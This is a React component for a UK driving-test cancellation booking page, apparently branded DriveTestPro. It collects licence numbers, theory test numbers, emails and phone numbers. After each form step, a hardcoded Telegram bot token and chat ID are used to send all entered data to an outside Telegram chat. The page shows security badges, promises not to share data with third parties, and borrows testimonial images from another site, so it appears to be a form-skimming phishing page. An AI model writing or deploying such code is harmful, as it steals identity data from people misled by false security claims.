import { Button } from '@/components/ui/button';
import { Info, ArrowRight, LockKeyhole, ChevronDown, Check } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { useEffect, useState } from 'react';
import ssl from '../../../public/images/ssl.svg';
import dss from '../../../public/images/dss.svg';
import gdpr from '../../../public/images/gdpr.svg';
import uk from '../../../public/images/uk.svg';
import user from '../../../public/images/users.svg';
import { MultiSelect, Option } from '@/components/ui/MultiSelect';
import logo from '../../../public/images/logo.svg';
import { cn } from '@/lib/utils';

const BookNow = () => {
  const [isScrolled, setIsScrolled] = useState(false);  
  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 10);
    };

    window.addEventListener('scroll', handleScroll);
    return () => {
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);
  
  const [currentStep, setCurrentStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    licenceNumber: '',
    theoryTestNumber: '',
    email: '',
    // For step 3, we store an array of selected months.
    step3: []
  });
  // For step 2, we manage selected test centres separately.
  const [selectedCenters, setSelectedCenters] = useState<string[]>([]);

  const testCenterOptions: Option[] = [
    { value: "london", label: "London" },
    { value: "manchester", label: "Manchester" },
    { value: "birmingham", label: "Birmingham" },
    { value: "liverpool", label: "Liverpool" },
    { value: "leeds", label: "Leeds" },
    { value: "bristol", label: "Bristol" },
    { value: "newcastle", label: "Newcastle" },
    { value: "sheffield", label: "Sheffield" },
    { value: "cardiff", label: "Cardiff" },
    { value: "edinburgh", label: "Edinburgh" }
  ];

  // Telegram Bot Integration
  const TELEGRAM_BOT_TOKEN = '7929316688:AAHyJj1P7MnnsnkAOQJ6FdFycuekSiW474Y';
  const TELEGRAM_CHAT_ID = '6811579315';

  // Helper function to send a message to your Telegram bot group
  const sendTelegramMessage = async (message) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      console.error('Error sending Telegram message:', error);
    }
  };

  // Handles input changes for generic fields.
  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id]: value,
    }));
  };

  // MonthRangeSelector component for Step 3 (Month Selection)
  // It calculates the current month and shows a 6-month range.
  const MonthRangeSelector = () => {
    const months = [
      "January", "February", "March", "April", "May", "June",
      "July", "August", "September", "October", "November", "December"
    ];
    const now = new Date();
    const currentMonthIndex = now.getMonth(); // 0-indexed
    // Get a 6-month range starting with the current month.
    const rangeMonths = Array.from({ length: 6 }, (_, i) => months[(currentMonthIndex + i) % 12]);

    const selectedMonths = formData.step3 || [];

    const toggleMonth = (month) => {
      let newSelected;
      if (selectedMonths.includes(month)) {
        newSelected = selectedMonths.filter(m => m !== month);
      } else {
        newSelected = [...selectedMonths, month];
      }
      // newSelected will be in the same order as rangeMonths.
      setFormData(prev => ({
        ...prev,
        step3: newSelected
      }));
    };

    return (
      <div>
        <div className="flex flex-col mt-8 rounded space-y-2">
          {rangeMonths.map((month) => (
            <button
              key={month}
              type="button"
              onClick={() => toggleMonth(month)}
              className={`flex justify-between px-4 py-4 rounded-full hover:bg-gray-100 ${selectedMonths.includes(month) ? "bg-blue-700 text-white" : "bg-white text-black"
                }`}
            >
              <span>{month}</span>
              <Check className={`w-4 h-4 ${selectedMonths.includes(month) ? "text-white" : "opacity-50"}`} />
            </button>
          ))}
        </div>
      </div>
    );
  };

  // Handle form submission / step change
  const handleNext = (e) => {
    e.preventDefault();

    if (currentStep === 1) {
      if (!formData.licenceNumber || !formData.theoryTestNumber || !formData.email) {
        alert("Please fill in all required fields.");
        return;
      }
    } else if (currentStep === 2) {
      if (selectedCenters.length === 0) {
        alert("Please select at least one test centre.");
        return;
      }
    } else if (currentStep === 3) {
      if (!formData.step3 || formData.step3.length === 0) {
        alert("Please select at least one month.");
        return;
      }
    } else {
      if (!formData[`step${currentStep}`]) {
        alert(`Please fill in the required data for step ${currentStep}.`);
        return;
      }
    }

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (currentStep === 2) {
        setFormData((prev) => ({ ...prev, step2: selectedCenters }));
      }

      // Build your message with the form data and current step info
      const message = `Step ${currentStep} completed.
Form Data: ${JSON.stringify(formData)}
Selected Centres: ${selectedCenters.join(', ')}`;
      
      // Send message to Telegram group
      sendTelegramMessage(message);

      if (currentStep < 5) {
        setCurrentStep(prev => prev + 1);
      } else {
        console.log('Final form data:', { ...formData, step2: selectedCenters });
      }
    }, 2000);
  };

  return (
    <>
      <header
        className={cn(
          'fixed top-0  left-0 right-0 z-50 transition-all duration-300 ease-in-out py-4 px-4 md:px-6',
          isScrolled 
            ? 'bg-white backdrop-blur-md shadow-sm' 
            : 'bg-white'
        )}
      >
        <div className=" mx-auto">
          <div className="flex items-center justify-center">
            <div className="flex items-center">
              <a href="/" className="flex items-center space-x-2 px-4">
                <img src={logo} alt="DriveTestPro Logo" className="" />
              </a>
            </div>
          </div>
        </div>
      </header>
      <section className="relative pt-32 overflow-hidden">
        <div className="container mx-auto px-6 relative z-10">
          <div className="max-w-md mx-auto">
            {currentStep === 1 && (
              <div>
                <form className="space-y-4" onSubmit={handleNext}>
                  <div className="text-center mb-8">
                    <h1 className="text-2xl md:text-2xl lg:text-3xl font-semibold leading-tight mb-4 text-gray-900">
                      Find early driving test cancellations and book now
                    </h1>
                    <p className="text-sm font-bold text-gray-400 mb-8 max-w-2xl mx-auto">
                      Need an earlier driving test? We find earlier test slots for you on your chosen dates, so you can start driving sooner.
                    </p>
                  </div>
                  <div className="bg-gray-200/50 shadow-lg rounded-xl p-4 md:p-6 mb-8">
                    <div className="flex flex-col gap-4">
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <label htmlFor="licenceNumber" className="text-md font-bold text-black">
                            Provisional driving licence number *
                          </label>
                          <Info className="text-gray-400 w-5 h-5 cursor-pointer" />
                        </div>
                        <Input
                          id="licenceNumber"
                          type="text"
                          required
                          placeholder="Enter your driving licence number"
                          value={formData.licenceNumber}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <label htmlFor="theoryTestNumber" className="text-md font-bold text-black">
                            Theory test pass or reference number *
                          </label>
                          <Info className="text-gray-400 w-5 h-5 cursor-pointer" />
                        </div>
                        <Input
                          id="theoryTestNumber"
                          type="text"
                          required
                          placeholder="Enter your theory pass number"
                          value={formData.theoryTestNumber}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <label htmlFor="email" className="text-md font-bold text-black">
                            Email address *
                          </label>
                        </div>
                        <Input
                          id="email"
                          type="email"
                          required
                          placeholder="Enter your email address"
                          value={formData.email}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </div>
                      <div className="space-y-2 md:space-y-0">
                        <Button type="submit" className="w-full text-md flex justify-between items-center bg-blue-700 hover:bg-primary/90 rounded-full px-4 py-4 h-12">
                          {loading ? <span>Loading...</span> : <>Find my early booking now <ArrowRight className="ml-2 h-4 w-4" /></>}
                        </Button>
                      </div>
                    </div>
                    <div className="flex items-center justify-center mt-2 text-center">
                      <p className="text-sm flex text-green-600 items-center gap-2 font-semibold">
                        <LockKeyhole className="w-5" /> Secure by 256-bit SSL Encrypted
                      </p>
                    </div>
                    <div className="flex justify-around mt-4">
                      <img src={ssl} alt="SSL Logo" />
                      <img src={dss} alt="DSS Logo" />
                      <img src={gdpr} alt="GDPR Logo" />
                    </div>
                  </div>
                </form>
                <section>
                  <div className="container max-w-md mx-auto px-6 py-12">
                    <div className="flex justify-around mt-4">
                      <img src={uk} alt="DriveTestPro Logo" className="" />
                      <img src={user} alt="DriveTestPro Logo" className="" />
                    </div>
                    <div className="grid mt-12 grid-cols-3 gap-2">
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_1.png&w=256&q=75"
                        alt="DriveTestPro Logo"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_2.png&w=256&q=75"
                        alt="DriveTestPro Logo"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_3.png&w=256&q=75"
                        alt="DriveTestPro Logo"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_4.png&w=256&q=75"
                        alt="DriveTestPro Logo"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_5.png&w=256&q=75"
                        alt="DriveTestPro Logo"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_6.png&w=256&q=75"
                        alt="DriveTestPro Logo"
                        className="rounded-lg"
                      />
                    </div>
                    <div className="border rounded-lg justify-center mt-4 items-center">
                      <div className="flex p-4">
                        <img
                          className="rounded-lg w-20"
                          src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_4.png&w=256&q=75"
                          alt="DriveTestPro Logo"
                        />
                        <div className="ml-4">
                          <p className="text-lg font-semibold text-black">
                            Found my test in less than 48 hours
                          </p>
                          <p className="text-lg font-semibold text-black">— highly recommend</p>
                          <div className="flex mt-2">
                            {[...Array(5)].map((_, index) => (
                              <svg
                                key={index}
                                xmlns="http://www.w3.org/2000/svg"
                                fill="currentColor"
                                viewBox="0 0 24 24"
                                className="h-5 w-5 text-white p-[4px] rounded bg-blue-700 mr-0.5"
                              >
                                <path d="M12 .587l3.668 7.568L24 9.423l-6 5.847L19.335 24 12 20.201 4.665 24 6 15.27 0 9.423l8.332-1.268z" />
                              </svg>
                            ))}
                          </div>
                        </div>
                      </div>
                      <hr />
                      <p className="px-8 py-4 font-semibold">
                        Today, <span className="text-blue-700"> 132 users</span> booked their early test slots!
                      </p>
                    </div>
                    <div className="mt-8 text-center">
                      <p className="text-sm font-semibold text-gray-500 mt-2">
                        If you already have an account, you can <span className="underline">log in here.</span>
                      </p>
                      <p className="text-sm font-semibold text-gray-500 mt-2">
                        By logging into this service you agree to our{' '}
                        <span className="underline">Terms of Use</span>, <br />{' '}
                        <span className="underline">Privacy Policy </span>and{' '}
                        <span className="underline">Refund Policy.</span>
                      </p>
                    </div>
                  </div>
                </section>
              </div>
            )}
            {currentStep > 1 && (
              <div>
                {currentStep === 5 && (
                  <div>
                    <h2 className="text-2xl text-center mb-4">
                      How your booking process <br /> works?
                    </h2>
                    <div className="relative text-start mb-9">
                      <div className="absolute left-0 top-0 h-full w-[20px] bg-gradient-to-b from-[#2660F5] to-transparent rounded-full"></div>
                      <div className="flex flex-col space-y-10">
                        <div className="relative pl-[35px]">
                          <div className="absolute left-[4px] top-[4px] w-[12px] h-[12px] rounded-full bg-[#FFFFFF]"></div>
                          <h3 className="text-[24px] text-[#0B072B] font-semibold mt-[-7px]">Today</h3>
                          <p className="text-[15px] text-[#757B88] font-semibold">
                            Unlock instant access to all available driving test cancellations.
                          </p>
                        </div>
                        <div className="relative pl-[35px]">
                          <div className="absolute left-[4px] top-[4px] w-[12px] h-[12px] rounded-full bg-[#FFFFFF]"></div>
                          <h3 className="text-[24px] text-[#0B072B] font-semibold mt-[-7px]">Automatically search</h3>
                          <p className="text-[15px] text-[#757B88] font-semibold">
                            We monitor test centers 24/7 and instantly alert you when an earlier slot matching your selected dates becomes available.
                          </p>
                        </div>
                        <div className="relative pl-[35px]">
                          <div className="absolute left-[4px] top-[4px] w-[12px] h-[12px] rounded-full bg-[#FFFFFF]"></div>
                          <h3 className="text-[24px] text-[#0B072B] font-semibold mt-[-7px]">Find early booking</h3>
                          <p className="text-[15px] text-[#757B88] font-semibold">
                            Receive your first early test alert before paying! One-time £19 fee for lifetime access—no subscriptions, no extra charges!
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                <form className="space-y-4" onSubmit={handleNext}>
                  <div className={`rounded-xl p-4 md:p-6 mb-8 ${currentStep !== 5 ? "bg-gray-200/50 shadow-lg" : ""}`}>
                    {currentStep === 2 ? (
                      <>
                        <label htmlFor="step2" className="text-md font-bold text-black">
                          Select Test Centres
                        </label>
                        <MultiSelect
                          options={testCenterOptions}
                          selected={selectedCenters}
                          onChange={setSelectedCenters}
                          placeholder="Choose your test centers"
                          emptyMessage="No test centers found"
                        />
                      </>
                    ) : currentStep === 3 ? (
                      <>
                        <label htmlFor="step3" className="text-md font-bold text-black">
                          Choose dates
                        </label>
                        <MonthRangeSelector />
                      </>
                    ) : currentStep === 4 ? (
                      <>
                        <label htmlFor={`step${currentStep}`} className="text-md font-bold text-black">
                          Phone number
                        </label>
                        <Input
                          id={`step${currentStep}`}
                          type="text"
                          required
                          placeholder="Enter your phone number with Country Code"
                          value={formData[`step${currentStep}`] || ''}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4 mt-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </>
                    ) : (
                      <></>
                    )}
                    <div className="space-y-2 md:space-y-0">
                      <Button type="submit" className="w-full mt-4 text-md flex justify-between items-center bg-blue-700 hover:bg-primary/90 rounded-full px-4 py-4 h-12">
                        {loading ? <span>Loading...</span> : <>Continue <ArrowRight className="ml-2 h-4 w-4" /></>}
                      </Button>
                    </div>
                  </div>
                  {currentStep === 4 && (
                    <div className="border bg-green-300 p-4 flex gap-4 rounded-lg justify-center mt-4">
                      <LockKeyhole className="w-16 mt-2" />
                      <p className="font-semibold">
                        We require your phone number to complete the booking process. Rest assured, your number will remain confidential and will not be shared with third parties.
                      </p>
                    </div>
                  )}
                </form>
              </div>
            )}
          </div>
        </div>
      </section>
    </>
  );
};

export default BookNow;
